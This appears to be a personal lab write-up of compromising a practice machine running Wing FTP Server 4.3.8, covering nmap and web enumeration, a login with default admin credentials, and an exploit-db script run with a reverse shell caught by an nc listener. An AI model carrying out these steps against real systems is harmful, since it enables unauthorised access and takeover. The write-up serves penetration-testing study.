# Create file

```bash
mkdir steven
cd steven
mkdir nmap gobuster exploit
touch users.txt creds.txt
echo 'Testing....1...2...3...' > test.txt
```

# Network Scanning

```bash
ip='10.11.1.36'
## Regular Scan + Version
sudo nmap -Pn -n $ip -sC -sV -p- --open -oN nmap/nmap.log
```

Reminder:
1. Check all the version
2. Check all the open ports

![Nmap Scan Results]("ss/Pasted image 20260226134317.png")

Hmmm I got a lot of information here, lets do it step by step.

## FTP

```bash
ftp $ip
anonymous::anonymous
"Login failed"
```

![[Pasted image 20260226134440.png]]

Lets check version, Wing FTP Server

![[Pasted image 20260226134621.png]]

Seems like a lot of information here, but couldn't get any version yet, lets do more enumeration here.

## smb

from the opening port, i saw smb port is open. Lets do smb port enumeration

```bash
smbclient -L //$ip
```

![[Pasted image 20260226134915.png]]

it seems like they dont have any share group here

```bash
# lets use enum3linux to find any useful information
enum4linux -a $ip
"No extra information here"
```

## HTTP Port Open

![[Pasted image 20260226134740.png]]

from nmap scan, i could see it is related to Wing FTP Server

![[Pasted image 20260226135334.png]]



``` bash
# Gobuster
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -o gobuster/dir.log -t 42

# dirsearch
dirsearch -u $ip
```

![[Pasted image 20260226135758.png]]

![[Pasted image 20260226135950.png]]

it seems like they didn't show a lot information here.
Lets try deep search

## http 5466

hmm this is an admin page

![[Pasted image 20260226142024.png]]

```bash
# lets try week password
anonymous::anonymous
"Failed"

admin::admin
"Success"
```

![[Pasted image 20260226142118.png]]

Lets see what kind of information, i can gain from here

![[Pasted image 20260226142154.png]]

seems like is a version 4.3.8

Lets search exploit

```bash
searchsploit wing ftp server 4.3.8

searchsploit -m 50720
```

![[Pasted image 20260226142325.png]]

found the exploit, which fit my case a lot

```bash
# lets try running the exploits
python3 50720.py 10.11.1.36 5466 172.16.1.2 4444 admin admin

#open a listener
sudo nc -lnvp 4444
```

![[Pasted image 20260226142725.png]]
# local.txt
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami
id
```

![[Pasted image 20260226142747.png]]

# Windows Privilege Escalation
```powershell
whoami
# Since i already the authority and system straight look for flags

type ket.txt

```

![[Pasted image 20260226143304.png]]